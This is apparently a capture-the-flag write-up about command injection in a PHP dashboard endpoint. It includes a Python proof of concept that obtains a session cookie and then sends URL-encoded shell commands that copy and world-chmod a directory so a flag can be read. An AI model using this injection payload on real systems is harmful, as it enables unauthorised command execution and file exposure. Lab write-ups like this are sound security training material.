

# Vulnerability
---

## Summary
The `/dashboard.php` endpoint builds a shell command using untrusted GET parameters (`page`, `per_page`, `dataset`) and executes it with `shell_exec` without proper escaping. This enables arbitrary command execution.

## Root Cause
In [internal/dashboard.php](internal/dashboard.php#L8-L13), user-controlled input is interpolated directly into a shell command:

```php
shell_exec("/var/www/internal/data/update-preferences $p $pp $d");
```

Because `$p`, `$pp`, and `$d` are not quoted or escaped, shell metacharacters are interpreted by the shell.

## Impact
An attacker who can reach the endpoint (with a valid session) can execute arbitrary OS commands as the web server user (e.g., `www-data`). This can lead to lateral movement in the system depending on permissions.

## Severity
High — remote command execution under the web server account.

# PoC
---

```python
#!/usr/bin/env python3
import requests
import re

TARGET = "http://internal.ecorp.epi"
API_KEY = "EPI{W3lC0m3_70_0v3RFL0wZ}"

import re

def extract_flag_from_file(file_path: str) -> str:
    """Extrait le flag au format EPI{...} dans un fichier."""
    try:
        with open(file_path, 'r') as file:
            content = file.read()
            flag = re.findall(r"EPI\{[^}]+\}", content)
            if flag:
                print(f"[+] Flag trouvé : {flag[0]}")
                return flag[0]
            else:
                print("[-] Aucun flag trouvé dans le fichier.")
                return None
    except FileNotFoundError:
        print(f"[-] Le fichier {file_path} n'existe pas.")
        return None
    except Exception as e:
        print(f"[-] Erreur lors de la lecture du fichier : {e}")
        return None



def exploit():
    print("[*] Étape 1 : Récupération du PHPSESSID via format string overflow...")

    # Requête pour obtenir le PHPSESSID
    resp = requests.post(
        TARGET,
        data=f"username=%2532cintrauser&api_key={API_KEY}",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        allow_redirects=False
    )

    # Récupération du cookie
    session_cookie = resp.cookies.get("PHPSESSID")
    if not session_cookie:
        print("[-] Échec : Aucun PHPSESSID dans la réponse.")
        print("Headers reçus :", resp.headers)
        return

    print(f"[+] PHPSESSID obtenu : {session_cookie}")

    # Vérification de la redirection
    if resp.status_code != 302:
        print(f"[-] Code HTTP inattendu : {resp.status_code} (attendu 302)")
        return
    if resp.headers.get("Location") != "/dashboard.php":
        print(f"[-] Redirection inattendue : {resp.headers.get('Location')}")
        return
    print("[+] Redirection vers /dashboard.php confirmée")

    # --- Étape 2 : Exploitation de /dashboard.php ---
    print("\n[*] Étape 2 : Accès à /dashboard.php avec payload malveillante...")

    # Construction de l'URL avec la payload (déjà encodée)
    payload_url = (
        f"{TARGET}/dashboard.php?"
        "page=1%3Bcp%20-a%20/var/www/devops%20/tmp%3B"
        "chmod%20-R%20o%2Brwx%20/tmp/devops%3B"
        "printf%20%271%7C8%7Cok%27&"
        "per_page=OA==&"
        "dataset=ZW1wbG95ZWVz"
    )

    # Requête avec le cookie et suivi des redirections
    dash_resp = requests.get(
        payload_url,
        cookies={"PHPSESSID": session_cookie},
        allow_redirects=True
    )

    # Vérification de la réponse
    if dash_resp.status_code != 200:
        print(f"[-] /dashboard.php inaccessible (code {dash_resp.status_code})")
        print("Contenu :", dash_resp.text[:500])
        return

    print(f"[+] /dashboard.php accessible (code {dash_resp.status_code})")

    # Extraction du flag
    flag = extract_flag_from_file("/tmp/devops/old/data.txt")
    if not flag:
        print("\n[!] Le flag n'est pas trouvé.")

if __name__ == "__main__":
    exploit()

```


We can run any command now. So I copied `/var/www/devops` to `/tmp` and gave all permissions over it so we can explore it and find the flag.